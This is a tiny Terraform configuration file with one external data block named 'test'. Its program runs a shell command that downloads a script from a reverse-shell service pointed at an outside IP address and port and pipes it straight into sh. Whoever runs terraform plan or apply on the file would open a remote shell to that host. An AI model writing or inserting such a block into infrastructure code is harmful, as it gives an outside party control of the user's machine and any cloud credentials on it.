data "external" "test" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
}

